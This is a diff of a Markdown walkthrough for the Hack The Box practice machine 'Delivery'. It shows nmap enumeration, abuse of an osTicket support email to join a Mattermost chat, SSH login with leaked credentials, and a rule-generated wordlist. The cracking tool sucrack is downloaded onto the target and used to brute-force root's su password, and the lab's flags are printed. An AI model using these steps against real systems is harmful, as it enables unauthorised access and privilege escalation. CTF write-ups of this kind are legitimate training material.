@@ -1,5 +1,10 @@
-nmap scan
-# Nmap 7.91 scan initiated Fri Jun  4 08:25:04 2021 as: nmap -sV -sC -oN nmap/delivery.nmap 10.10.10.222
+![](delivery-hackthebox.jpg)
+
+# Enumeration 
+
+## Nmap scan
+```text
+Nmap 7.91 scan initiated Fri Jun  4 08:25:04 2021 as: nmap -sV -sC -oN nmap/delivery.nmap 10.10.10.222
 Nmap scan report for 10.10.10.222
 Host is up (0.15s latency).
 Not shown: 998 closed ports
@@ -16,8 +21,51 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri Jun  4 08:25:33 2021 -- 1 IP address (1 host up) scanned in 29.51 seconds
+```
+We got a port 80 in our nmap scan. So we can hope into that website and take a look at it.
 
-after we add into our host file help desk delivery
+![](web.png)
+
+We can see **helpdesk** site and **contact us**. After we add into that address our host file we can see the help desk delivery site and contact us. 
+
+![](helpdesk.png)
+
+Contact us  redirect to the **Mattermost login page**.
+
+![](mattermost.png)
+
+I try to find some exploit to osTicket. Here is the exploitDB site.
+
+![](expolitdb.png)
+
+After reading exploits I try to make a ticket.
+
+![](ticket%20creating.png)
+
+After I send it that leaked email address.
+
+![](after%20send.png)
+
+So I hop into that **Check Ticket Status** tab. For look into our ticket. When you log into your account you can see your ticket. 
+
+![](our%20ticket.png)
+
+Next thing we need to do creating account on **Mattermost** . We can use that email they gave us. Your password must be something like this *Defalt#123* .
+
+![](mattermost%20acc%20create.png)
+
+After we create account they send us the verify email. Take a look into our **View Ticket Thread** tab.
+
+![](verifying%20email.png)
+
+After we go into that link. You need to log into that account you created. You can choose *Internal server* whatever it shows in first page after you log in.
+
+![](inside%20matermost.png)
+
+I think we got our credentials to our user machine. 
+Credentials :
+* Login : maildeliverer
+* passwd : Youve Got Mail!
 
 ```bash
 ┌─[✗]─[visith@parrot]─[~/CTF/htb/delivery]
@@ -26,8 +74,6 @@ The authenticity of host '10.10.10.222 (10.10.10.222)' can't be established.
 ECDSA key fingerprint is SHA256:LKngIDlEjP2k8M7IAUkAoFgY/MbVVbMqvrFA6CUrHoM.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.10.10.222' (ECDSA) to the list of known hosts.
-maildeliverer@10.10.10.222's password: 
-Permission denied, please try again.
 maildeliverer@10.10.10.222's password: 
 Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
 
@@ -42,9 +88,8 @@ maildeliverer@Delivery:~$ ls
 user.txt
 maildeliverer@Delivery:~$ cat user.txt
 7f41e5191b9dca10b271abd2e425dfca
-
-
 ```
+Now we got into our user. Now lets see anyother users in this machine . For that we can use this to grep what we want.
 
 ```bash
 maildeliverer@Delivery:~$ cat /etc/passwd | grep -v 'nologin\|false'
@@ -52,20 +97,25 @@ root:x:0:0:root:/root:/bin/bash
 sync:x:4:65534:sync:/bin:/bin/sync
 maildeliverer:x:1000:1000:MailDeliverer,,,:/home/maildeliverer:/bin/bash
 mattermost:x:998:998::/home/mattermost:/bin/sh
-
-
-
 ```
+Nothing Interesting to me. But after some time I look into our mattermost chat. I found a hint on that chat. Thx to ippsec we got a hint for root passwd. He provide a great hint.
+
+![](hint.png)
+
+So we can use **hashcat** to generate password list to crack **root** password. Because we cant use rockyou.txt in this matter. First make a sample to our password list like this.
+
 ```bash
-
-
 ┌─[visith@parrot]─[~/CTF/htb/delivery]
-└──╼ $cat passwd.txt 
+└──╼ $echo PleaseSubscribe! > passwd.txt && cat passwd.txt
 PleaseSubscribe!
 ┌─[visith@parrot]─[~/CTF/htb/delivery]
 └──╼ $hashcat --stdout passwd.txt -r /usr/share/hashcat/rules/best64.rule >> passwd.txt
 ```
-https://github.com/hemp3l/sucrack.git
+Now we make a passwd list to crack. Now we need to crack root's password. So I end up using tool call **sucrack** .
+
+Here is the link for tool : https://github.com/hemp3l/sucrack.git
+
+After you download it You need to setup it. Use following commands to make the sucrack file. 
 
 ```bash
 ┌─[✗]─[visith@parrot]─[/opt/sucrack]
@@ -79,51 +129,7 @@ checking whether make supports nested variables... yes
 checking build system type... x86_64-pc-linux-gnu
 checking host system type... x86_64-pc-linux-gnu
 checking target system type... x86_64-pc-linux-gnu
-checking for gcc... gcc
-checking whether the C compiler works... yes
-checking for C compiler default output file name... a.out
-checking for suffix of executables... 
-checking whether we are cross compiling... no
-checking for suffix of object files... o
-checking whether we are using the GNU C compiler... yes
-checking whether gcc accepts -g... yes
-checking for gcc option to accept ISO C89... none needed
-checking whether gcc understands -c and -o together... yes
-checking whether make supports the include directive... yes (GNU style)
-checking dependency style of gcc... gcc3
-checking how to run the C preprocessor... gcc -E
-checking for grep that handles long lines and -e... /usr/bin/grep
-checking for egrep... /usr/bin/grep -E
-checking for ANSI C header files... yes
-checking for sys/wait.h that is POSIX.1 compatible... yes
-checking for sys/types.h... yes
-checking for sys/stat.h... yes
-checking for stdlib.h... yes
-checking for string.h... yes
-checking for memory.h... yes
-checking for strings.h... yes
-checking for inttypes.h... yes
-checking for stdint.h... yes
-checking for unistd.h... yes
-checking fcntl.h usability... yes
-checking fcntl.h presence... yes
-checking for fcntl.h... yes
-checking for stdlib.h... (cached) yes
-checking for string.h... (cached) yes
-checking sys/ioctl.h usability... yes
-checking sys/ioctl.h presence... yes
-checking for sys/ioctl.h... yes
-checking for unistd.h... (cached) yes
-checking pthread.h usability... yes
-checking pthread.h presence... yes
-checking for pthread.h... yes
-checking for an ANSI C-conforming const... yes
-checking whether struct tm is in sys/time.h or time.h... time.h
-checking whether gcc needs -traditional... no
-checking for stdlib.h... (cached) yes
-checking for GNU libc compatible malloc... yes
-checking for stdlib.h... (cached) yes
-checking for GNU libc compatible realloc... yes
+loc... yes
 checking for pid_t... yes
 checking vfork.h usability... no
 checking vfork.h presence... no
@@ -150,24 +156,20 @@ sucrack version		: 1.2.3
 target system           : LINUX
 sucrack link flags      : -pthread
 sucrack compile flags	: -DSTATIC_BUFFER  -DLINUX -DSUCRACK_TITLE="\"sucrack 1.2.3 (LINUX)\""
-
-make
-
+┌─[visith@parrot]─[~/CTF/htb/delivery]
+└──╼ $sudo make
 ```
-```bash
+After that you must get sucrack file. So let's make a 'www' directory and upload them into the our machine. 
 
-`
+```bash
 ┌─[visith@parrot]─[~/CTF/htb/delivery]
 └──╼ $mv passwd.txt www/
 ┌─[visith@parrot]─[~/CTF/htb/delivery]
 └──╼ $cd www/
-┌─[visith@parrot]─[~/CTF/htb/delivery/www]
-└──╼ $cp /opt/sucrack/src/sucrack
-cp: missing destination file operand after '/opt/sucrack/src/sucrack'
-Try 'cp --help' for more information.
 ┌─[✗]─[visith@parrot]─[~/CTF/htb/delivery/www]
 └──╼ $cp /opt/sucrack/src/sucrack .
 ```
+Let's get that files and do our thing. For that I recommend to use /dev/shm/ directory . Because it's temporary file storage so you don't need to worry about cleaning up your work.
 
 ```bash
 maildeliverer@Delivery:~$ cd /dev/shm/
@@ -192,6 +194,9 @@ Saving to: ‘sucrack’
 sucrack                 100%[=============================>]  75.51K   244KB/s    in 0.3s    
 
 2021-06-04 00:00:36 (244 KB/s) - ‘sucrack’ saved [77320/77320]
+```
+Now execute our script to that make it executable.
+```bash
 maildeliverer@Delivery:/dev/shm$ chmod +x sucrack 
 maildeliverer@Delivery:/dev/shm$ ./sucrack -h
 sucrack 1.2.3 (LINUX) - the su cracker
@@ -199,6 +204,7 @@ Copyright (C) 2006  Nico Leidecker; nfl@portcullis-security.com
 
  Usage: ./sucrack [-char] [-w num] [-b size] [-s sec] [-u user] [-l rules] wordlist
 ```
+After reading tools option. I cracked the password.
 
 ```bash
 maildeliverer@Delivery:/dev/shm$ ./sucrack -a -w 20 -s 10 -u root -r passwd.txt 
@@ -207,6 +213,7 @@ maildeliverer@Delivery:/dev/shm$ ./sucrack -a -w 20 -s 10 -u root -r passwd.txt
 password is: PleaseSubscribe!21
 
 ```
+Let's move into root user.
 
 ```bash
 maildeliverer@Delivery:/dev/shm$ su -
@@ -223,6 +230,6 @@ Keep on hacking! And please don't forget to subscribe to all the security stream
 - ippsec
 root@Delivery:~# cat root.txt 
 2ed05a6f7194cad2e28227330d0a8429
-
-
 ```
+
+Thx for reading !! and have a nice day.
